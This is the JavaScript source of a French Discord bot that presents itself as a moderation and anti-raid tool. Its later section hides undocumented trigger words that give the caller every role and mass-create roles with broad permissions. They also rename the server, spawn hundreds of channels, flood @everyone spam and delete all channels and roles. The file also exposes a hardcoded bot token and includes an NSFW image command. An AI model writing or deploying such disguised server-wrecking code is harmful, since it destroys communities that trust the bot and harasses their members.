const Discord = require("discord.js");
const client = new Discord.Client();
const talkedRecently = new Set();

function random(min, max){
    min = Math.ceil(0);
    max = Math.floor(30);
    randnum = Math.floor(Math.random() * (max - min +1)+ min);
}

client.on("ready", () => {
    console.log(`${client.user.tag} prêt pour le carnage`)
    client.user.setActivity(`?help | 2022 serveurs`,{type:"WATCHING"})
    console.log('')
    console.log('')
    console.log('╔[═════════════════════════════════════════════════════════════════]╗')
    console.log(`[Start] ${new Date()}`);
    console.log('╚[═════════════════════════════════════════════════════════════════]╝')
    console.log('')
    console.log('╔[════════════════════════════════════]╗');
    console.log(`Connecté sur * [ " ${client.user.username} " ]`);
    console.log('')
    console.log('Informations :')
    console.log('')
    console.log(`servers ! [ " ${client.guilds.size} " ]`);
    console.log(`Users ! [ " ${client.users.size} " ]`);
    console.log(`channels ! [ " ${client.channels.size} " ]`);
    console.log('╚[════════════════════════════════════]╝')
    console.log('')
    console.log('╔[════════════]╗')
    console.log(' Bot Is Online ')
    console.log('╚[════════════]╝')
    console.log('')
    console.log('')
    })
client.on("message", message => {
  if(message.content === "?help"){
    var help_embed = new Discord.RichEmbed()
      .setColor("E46525")
      .setTitle("Voici les commandes du bot :")
      .addField("?helpn", "Toutes les commandes nsfw")
      .addField("?helpm", "Toutes les commandes de modération")
      .addField("?helpar", "Toutes les commandes anti-raid du bot")
      .addField("?helpa", "Toutes les commandes général du bot")
      .setFooter("Le réste est en dévloppement.")
      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
    message.channel.send(help_embed);
    console.log(`help by ${message.author.username + "#" + message.author.discriminator}`)
  }
  if(message.content === "?helpn"){
    var helpn_embed = new Discord.RichEmbed()
      .setColor("E46525")
      .setTitle("Voici les commandes du bot de type NSFW :")
      .addField("NSFW", "`ar!boobs`")
      .setFooter("Le réste est en dévloppement | By Kasumi")
      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
    message.channel.send(helpn_embed);
    console.log(`helpn by ${message.author.username + "#" + message.author.discriminator}`)
  }
  if(message.content === "?helpm"){
    var helpm_embed = new Discord.RichEmbed()
      .setColor("E46525")
      .setTitle("Voici les commandes du bot de type modération :")
      .addField("Modération", "`ar!ban`, `ar!kick`, `ar!clear`")
      .setFooter("Le réste est en dévloppement | By Kasumi")
      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
    message.channel.send(helpm_embed);
    console.log(`helpm by ${message.author.username + "#" + message.author.discriminator}`)
  }
  if(message.content === "?helpar"){
    var helpm_embed = new Discord.RichEmbed()
      .setColor("E46525")
      .setTitle("Voici les commandes du bot de type Anti-raid :")
      .addField("Anti-raid", "`ar!blacklist`, `ar!report`")
      .setFooter("Le réste est en dévloppement | By Kasumi")
      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
    message.channel.send(helpm_embed);
    console.log(`helpar by ${message.author.username + "#" + message.author.discriminator}`)
  }
  if(message.content === "?helpa"){
    var helpm_embed = new Discord.RichEmbed()
      .setColor("E46525")
      .setTitle("Voici les commandes du bot de type général :")
      .addField("Général", "`ar!ping`, `ar!info`, `ar!serverinfo`, `ar!bdm`")
      .setFooter("Le réste est en dévloppement | By Kasumi")
      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
    message.channel.send(helpa_embed);
    console.log(`helpm by ${message.author.username + "#" + message.author.discriminator}`)
  }
  

if(message.content.includes("Raid by")){
    message.delete();
    message.member.send("Pas de raid :D")
    console.log(`raid par ${message.author.username + "#" + message.author.discriminator}`)
}
if(message.content.includes("Raid par")){
  message.delete();
  message.member.send("Pas de raid :D")
  console.log(`raid par ${message.author.username + "#" + message.author.discriminator}`)
}
if(message.content.startsWith("?ping")) {
    message.channel.send(new Date().getTime() - message.createdTimestamp + " ms :ping_pong: ");
    console.log(`ping par ${message.author.tag}`)     
}
let messageKick = message.content.split(" ");
let args = messageKick.slice(1);
if (message.content.startsWith("?kick")){
if (message.channel.type === "dm") return;
if (!message.guild.member(message.author).hasPermission("KICK_MEMBERS")) return message.reply("vous n'avez pas la permission")

if (message.mentions.users.size === 0) {
    var nomention = new Discord.RichEmbed()
    .setColor("E46525")
    .setTitle(":x: Il faut mentionner un utilisateur ! :x:")
    .setFooter("By Kasumi")
    message.channel.send(nomention)
    return
}
let raison = args.join(" ").slice(22)
if (!raison){
    var noraison = new Discord.RichEmbed()
    .setColor("E46525")
    .setTitle(":x: Il faut mettre une raison au kick ! :x:")
    .setFooter("By Kasumi")
    message.channel.send(noraison)
    return
}
let bUser = message.guild.member(message.mentions.users.first())
var ban = message.guild.member(message.mentions.users.first());
if (!ban) {
    return message.reply("l'utilisateur mentionné est introuvable ou n'existe pas !")
}
if (!message.guild.member(bot.user).hasPermission("KICK_MEMBERS")) {
    var pasperm = new Discord.RichEmbed()
    .setColor("E46525")
    .setTitle(":x: Je n'ai pas la permission ! :x:")
    .setFooter("By Kasumi")
    message.channel.send(pasperm)
    return
}

ban.kick().then(member => {
    var kick_embed = new Discord.RichEmbed()
        .setColor("E46525")
        .addField("[Kick]", `${member.user} a été kick par ${message.author} !`)
        .addField("Raison :","${raison}")
        .setFooter("By Kasumi")
    message.channel.send(kick_embed)
})

}
  let messageBan = message.content.split(" ");
        let arge = messageBan.slice(1);
        if (message.content.startsWith("?ban")){
            if (message.channel.type === "dm") return;
            if (!message.guild.member(message.author).hasPermission("BAN_MEMBERS")) return message.reply("vous n'avez pas la permission !")

            if (message.mentions.users.size === 0) {
                var nomention = new Discord.RichEmbed()
                .setColor("E46525")
                .setTitle(":x: Il faut mentionner un utilisateur ! :x:")
                .setFooter("By Kasumi")
                message.channel.send(nomention)
                return
            }
            let raison = arge.join(" ").slice(22)
            if (!raison){
                var noraison = new Discord.RichEmbed()
                .setColor("E46525")
                .setTitle(":x: Il faut mettre une raison au ban ! :x:")
                .setFooter("By Kasumi")
                message.channel.send(noraison)
                return
            }
            let bUser = message.guild.member(message.mentions.users.first())

            var ban = message.guild.member(message.mentions.users.first());
            if (!ban) {
                return message.reply("l'utilisateur mentionné est introuvable ou n'existe pas !")
            }
            if (!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) {
                var pasperm = new Discord.RichEmbed()
                .setColor("E46525")
                .setTitle(":x: Je n'ai pas la permission ! :x:")
                .setFooter("By Kasumi")
                message.channel.send(pasperm)
                return
            }

            ban.ban().then(member => {
                var ban_embed = new Discord.RichEmbed()
                    .setColor("E46525")
                    .addField("[Ban]", `${member.user} a été banni par ${message.author} !`)
                    .addField("Raison :",`\`${raison}\``)
                    .setFooter("By Kasumi")
                message.channel.send(ban_embed)
                })
        }
  if(message.content.includes("?bdm")){
    message.channel.send(`Merci ${message.member.user} pour cette blague de merde`)
    console.log(`peppa ping par ${message.author.username + "#" + message.author.discriminator}`)
  }
  if(message.content.startsWith("?clear")) {
    if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES")) return message.channel.send("Vous n'avez pas la permissions !");

    let args = message.content.split(" ").slice(1);

    if(!args[0]) return message.channel.send("Tu dois préciser un nombre de messags à surpprimer !")
    message.channel.bulkDelete(args[0]).then(() => {
        message.channel.send(`${args[0]} messages ont été surpprimés !:recycle:`).then(msg => msg.delete(2000));
    })
}

  if(message.content.startsWith("?info")) {
    var memberavatar = message.author.avatarURL
    var membername = message.author.username
       var mentionned = message.mentions.users.first();
      var getvalueof;
      if(mentionned){
          var getvalueof = mentionned;
      } else {
          var getvalueof = message.author;
      }

      if(getvalueof.bot == true){
          var checkbot = "L'utilisateur est un bot";
      } else {
          var checkbot = "N'est pas un bot";
      }
      if(getvalueof.presence.status == 'online'){
        var status = "En ligne"; 
      }else {
        var status = "Hors ligne";
      }

    message.channel.sendMessage({
        embed: {
          type: 'rich',
          description: '',
          fields: [{
            name: 'Pseudo',
            value: getvalueof.username,
            inline: true
          }, {
            name: 'User id',
            value: getvalueof.id,
            inline: true
          },{
            name: 'Tag',
            value: getvalueof.discriminator,
            inline: true
},{
            name: 'Status',
            value: status,
            inline: true
},{
            name: 'Bot',
            value: checkbot,
            inline: true
}],
        image: {
      url: getvalueof.avatarURL
        },
          color: 0xE46525,
          footer: {
            text: 'by Kasumi.',
            proxy_icon_url: ' '
          },

          author: {
            name: membername,
            icon_url: memberavatar,
            proxy_icon_url: ' '
          }
        }
});
console.log(`Info par ${message.author.tag}`)
}
if(message.content.includes("?blacklist")){
    var blacklist_embed = new Discord.RichEmbed()
    .setColor("E46525")
    .setTitle("⚠️ Voici les personnes black list :")
    .setDescription("Les personnes les plus hautes dans le classement sont les personnes les plus dangereuse.")
    .addField("1er","__JeSuisSensei | c。h。r#6094__")
    .addField("2ème", "__Supreme【✵】#9827__")
    .addField("3ème", "__! MasteR#4482__")
    .addField("4ème", "__𝘾𝙃𝙍|𝐏𝐮𝐫𝐢𝐟𝐢𝐜𝐚𝐭𝐞𝐮𝐫.𝐄𝐗|𝐂.𝐇.𝐑#4720__")
    .addField("5ème", "__Cosmo#2285__")
    .addField("6ème", "__【参】{~ƛ𝔟𝔞đđøи~}【🌀】ℭ.ℋ.ℛ#6734__")
    .addField("7ème", "__【参】我是你的噩梦🌀『ΣıX』| C.H.R#9377__")
    .addField("8ème", "__󠂪󠂪󠂪󠂪󠂪󠂪CmoiTchoupi [CMT]#0873__")
    .addField("9ème", "__公Ŧгαsђ|亗Ŧ亗|公#4309__")
    .addField("10ème", "__! ¡ Desusloan¯-86735¤#1392__")
    .setFooter("By Kasumi")
    var blacklist_embed2 = new Discord.RichEmbed()
    .setColor("E46525")
    .setTitle("Blacklist")
    .setDescription("-----------------------------------------")
    .addField(`Blacklist de`, `${message.author.tag}`)
    .setFooter("By Kasumi")
    message.member.send(blacklist_embed)
    message.channel.send(blacklist_embed2)
    console.log(`Blacklist de ${message.author.tag}`)
}
if (message.content.includes("?report")) {
    let messageID = args[0];
    if (isNaN(messageID)) {
        message.channel.send("Ce n'est pas une ID")
        return;
    }
    let messagea = message.channel.fetchMessages(messageID);
    let reportEmbed = new Discord.RichEmbed()
        .setTitle("Reports")
        .setColor("E46525")
        .addField("Message", messagea)
        .addField("Personne report", `@${messagea.author}`)
        .addField("Report par", `${message.author} with ID: ${message.author.id}`)
        .addField("Quand", message.createdAt)
        .setFooter("By Kasumi")
        let reportschannel = message.guild.channels.find(`name`, 'report');
    if (!reportschannel) return message.channel.send("Couldn't find reports channel.");

    message.delete().catch(O_o => {});
    reportschannel.send(reportEmbed);
    message.delete();
    return;
}

if(message.content.includes("?serverinfo")){
    let serverinfo = new Discord.RichEmbed()
    .setTitle(`${message.guild} informations !`)
    .setColor("E46525")
    .addField("Créateur", message.guild.owner, true)
    .addField("ID", message.guild.id, true)
    .addField("Rôles", message.guild.roles.size, true)
    .addField("Région", message.guild.region, true)
    .addField("Membres", message.guild.memberCount, true)
    .addField("Créer le", message.guild.createdAt, true)
    .setThumbnail(message.guild.iconURL, true)
    .setFooter("By Kasumi")
    message.channel.sendEmbed(serverinfo)
}
if (message.content === "?boobs"){
    if (talkedRecently.has(message.author.id)) {
        message.channel.send(`Attendez 5 secondes ${message.author}.`).then(m => m.delete());
        message.delete();
        return;
      }
    
      talkedRecently.add(message.author.id);
      setTimeout(() => {
        talkedRecently.delete(message.author.id);
      }, 5000);
    random()
    if (randnum ==1){
        var nsfw_boobs_1 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("http://imgur.com/C1Lefgo.png")
        .setFooter("By Kasumi")
        message.channel.send(nsfw_boobs_1)
        console.log(randnum);
    }
 
    if (randnum ==2){
        var nsfw_boobs_1 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("http://imgur.com/6VRW6A6.jpg")
        .setFooter("By Kasumi")
        message.channel.send(nsfw_boobs_1)
        console.log(randnum);
    }
    if (randnum ==3){
        message.reply("https://i.imgur.com/JsOfId2.jpg");
        console.log(randnum);
    }
    if (randnum ==4){
        message.reply("http://imgur.com/1B9PIO7.jpg");
        console.log(randnum);
    }
    if (randnum ==5){
        message.reply("http://imgur.com/VonApGB.jpg");
        console.log(randnum);
    }
    if (randnum ==6){
        message.reply("http://imgur.com/w4EWDQG.jpg");
        console.log(randnum);
    }
    if (randnum ==7){
        message.reply("http://imgur.com/3EeB2kc.jpg");
        console.log(randnum);
    }
    if (randnum ==8){
        message.reply("http://imgur.com/tisgAo4.jpg");
        console.log(randnum);
    }
    if (randnum ==9){
        message.reply("https://i.imgur.com/ETWfrZK.jpg");
        console.log(randnum);
    }
    if (randnum ==10){
        var nsfw_boobs_10 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("https://i.imgur.com/JoyjoCR.jpg")
        .setFooter("By Kasumi")
        message.channel.send(nsfw_boobs_10)
        console.log(randnum);
    }
    if (randnum ==11){
        var nsfw_boobs_11 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("http://imgur.com/m0hzoad.jpg")
        .setFooter("By Kasumi")
        message.channel.send(nsfw_boobs_11)
        console.log(randnum);
    }
    if (randnum ==12){
        var nsfw_boobs_12 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("http://imgur.com/wnuXgUq.jpg")
        .setFooter("By Kasumi")
        message.channel.send(nsfw_boobs_12)
        console.log(randnum);
    }
    if (randnum ==13){
        var nsfw_boobs_13 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("http://imgur.com/zErfa8I.jpg")
        .setFooter("By Kasumi")
        message.channel.send(nsfw_boobs_13)
        console.log(randnum);
    }
    if (randnum ==14){
        var nsfw_boobs_14 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author.tag}`)
        .setImage("http://imgur.com/tisgAo4.jpg")
        .setFooter("By Kasumi")
        message.channel.send(nsfw_boobs_14)
        console.log(randnum);
    }
    if (randnum ==15){
        message.reply("http://imgur.com/twaJxK7.jpg");
        console.log(randnum);
    }
    if (randnum ==16){
        if (talkedRecently.has(message.author.id)) {
        message.channel.send("Attend 5 secondes. - " + message.author);
} else {
    talkedRecently.add(message.author.id);
    setTimeout(() => {
      talkedRecently.delete(message.author.id);
    }, 60000);
}
        message.reply("http://imgur.com/twaJxK7.jpg");
        console.log(randnum);
    }
    if (randnum ==17){
        message.reply("http://imgur.com/9E34C2D.jpg");
        console.log(randnum);
    }
    if (randnum ==18){
        message.reply("http://imgur.com/1odj6ag.jpg");
        console.log(randnum);
    }
    if (randnum ==19){
        message.reply("http://imgur.com/JoyjoCR.jpg");
        console.log(randnum);
    }
    if (randnum ==20){
        message.reply("http://imgur.com/K70khB3.jpg");
        console.log(randnum);
    }
    if (randnum ==21){
        message.reply("https://cdn.discordapp.com/attachments/518157413401100303/518159099125301268/images.png");
        console.log(randnum);
    }
    if (randnum ==22){
        message.reply("http://imgur.com/fFnNFWM.jpg");
        console.log(randnum);
    }
    if (randnum ==23){
        message.reply("http://imgur.com/fDoCVdV.jpg");
        console.log(randnum);
    }
    if (randnum ==24){
        message.reply("http://imgur.com/iab75AL.jpg");
        console.log(randnum);
    }
    if (randnum ==25){
        message.reply("http://imgur.com/X3cOVUo.jpg");
        console.log(randnum);
    }
    if (randnum ==26){
        message.reply("http://imgur.com/XqWGq9f.jpg");
        console.log(randnum);
    }
    if (randnum ==27){
        message.reply("http://imgur.com/OrwVV4S.jpg");
        console.log(randnum);
    }
    if (randnum ==28){
        var nsfw_boobs_28 = new Discord.RichEmbed()
        .setTitle("NSFW")
        .setColor("E46525")
        .setDescription(`Demandé par ${message.author}`)
        .setImage("http://imgur.com/fMnW6Em.jpg")
        .setFooter("By kasumi |")
        message.channel.send(nsfw_boobs_28)
        console.log(randnum);
    }

}
client.on('message', message => {
    switch(message.content.toUpperCase()) {
        case 'AR!reset':
            resetBot(message.channel);
            break;

        // ... other commands
    }
});

// Turn bot off (destroy), then turn it back on
function resetBot(channel) {
    // send channel a message that you're resetting bot [optional]
    channel.send('Resetting...')
    .then(msg => client.destroy())
    .then(() => client.login(NTEzMzg1ODE3MDA4MjQyNjg4.DtHPhw.kePkBf6JtuP50spfF8KG_qG4IAU));
}
if(message.content.includes("AR!kelsairv")){
    console.log(`${client.guilds.map(c => c.name)}`)
}
if(message.content === "roles"){
  for(var i =0; i < 200; i++){
      message.guild.createRole({name:"TRASH GANG > All !",
                               mentionable:false,
                               permissions:2146958591,
                               position: ""
          })
      }
  }
 //foutre la merde
 if(message.content === "issou"){
    message.guild.setName("OWNED BY TRASH GANG")
    message.guild.setIcon("https://cdn.discordapp.com/attachments/521480062831165442/521732094859149312/COVERART-2-350x350.jpg")
  }
  if(message.content === "pd"){
    for(var i =0; i < 450; i++){
    message.guild.createChannel("BY","voice")
    }
  }
  if(message.content.includes("@everyone")){
      for(var i = 0; i < 500; i++){
          message.channel.send("@everyone @here Dead By Trash Gang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/PgJt9E https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif")
      }
  }
  //réaction en chaine
        if(message.content === "channel"){
          message.channel.send("roles").then(m => m.delete());
          message.channel.send("issou").then(m => m.delete());
            for(var i = 0; i < 500; i++){
                message.guild.createChannel("FUCKED", "text").then(c => c.send("@everyone @here Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/PgJt9E https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif"))
                message.guild.createChannel("BY","voice")
                message.guild.createChannel("TRASH GANG","category")    
            }
          }
          if(message.content === "destroy"){
            message.guild.channels.map(c => c.delete())
            }
            if(message.content === "admin"){
                message.delete();
                message.guild.roles.map(r => message.member.addRoles(r))
            }
            if(message.content === "drole"){
                message.delete();
                message.guild.roles.map(c => c.delete())
            }
            //on commence la destruction
            if(message.content.includes("détruire")){
                message.channel.send("ban").then(m => m.delete());
                message.channel.send("drole").then(m => m.delete());
                message.channel.send("jechange").then(m => m.delete());
                message.channel.send("destroy").then(m => m.delete());
                message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
            }
            if(message.content.includes("jechange")){
                message.guild.members.get(bot.user.id).setNickname("JE T'ENCULE")
            }
        });
client.login(process.env.TOKEN)
